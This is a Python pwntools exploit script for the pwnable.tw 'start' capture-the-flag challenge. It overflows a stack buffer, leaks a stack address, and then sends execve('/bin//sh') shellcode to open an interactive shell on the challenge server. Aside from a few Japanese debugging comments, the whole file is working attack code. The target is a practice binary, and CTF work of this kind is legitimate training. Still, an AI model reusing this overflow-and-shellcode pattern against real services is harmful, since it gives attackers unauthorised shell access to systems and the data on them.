#!/usr/bin/env python
# coding: utf-8
from pwn import *

context(os="linux", arch="i386")
context.terminal = "tmux"


def main():
    conn = remote("chall.pwnable.tw", 10000)
    # conn = remote("localhost", 3000)

    # conn = process("./start")

    # こう書いて別terminalのgdbでattach pid をするだけでデバッグ可能
    # gdb.attach(conn, '''
    #     set follow-fork-mode child
    #     break execve
    #     continue
    # ''')

    # shellcode = "\x68\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x53\x31\xd2\x52\x6a\x0b\x58\xcd\x80"
    # shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
    shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"  # 28 bytes

    payload = "A" * 20
    payload += p32(0x8048087)

    conn.recvuntil(":")
    conn.send(payload)  # sendlineは使わない、改行入れないようにする
    leak_addr = u32(conn.recv(4))
    print "leak_addr: " + str(hex(leak_addr))

    payload = "A" * 20
    payload += p32(leak_addr + 0x14)
    payload += shellcode

    conn.sendline(payload)
    conn.interactive()


if __name__ == "__main__":
    main()
